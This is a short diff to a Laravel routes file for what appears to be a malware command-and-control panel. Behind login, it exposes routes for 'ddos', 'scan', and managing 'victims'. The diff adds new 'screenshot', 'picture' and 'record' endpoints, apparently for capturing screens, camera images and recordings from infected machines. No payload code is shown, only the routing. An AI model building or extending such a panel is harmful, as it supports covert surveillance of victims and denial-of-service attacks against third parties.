@@ -35,8 +35,11 @@ Route::middleware(['auth'])->group(function () {
     Route::get('network', [\App\Http\Controllers\NetworkController::class, 'index'])->name('network');
     Route::get('network/{id}', [\App\Http\Controllers\NetworkController::class, 'show'])->name('network.show');
     Route::post('network/{id}', [\App\Http\Controllers\NetworkController::class, 'destroy'])->name('network.destroy');
-    Route::post('ddos', [\App\Http\Controllers\NetworkController::class, 'ddos'])->name('network.ddos');
     Route::post('scan', [\App\Http\Controllers\NetworkController::class, 'scan'])->name('network.scan');
+    Route::post('screenshot', [\App\Http\Controllers\NetworkController::class, 'screenshot'])->name('network.screenshot');
+    Route::post('picture', [\App\Http\Controllers\NetworkController::class, 'picture'])->name('network.picture');
+    Route::post('record', [\App\Http\Controllers\NetworkController::class, 'record'])->name('network.record');
+    Route::post('ddos', [\App\Http\Controllers\NetworkController::class, 'ddos'])->name('network.ddos');
     Route::get('victims', [\App\Http\Controllers\VictimsController::class, 'index'])->name('victims.index');
     Route::put('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'update'])->name('victims.update');
 
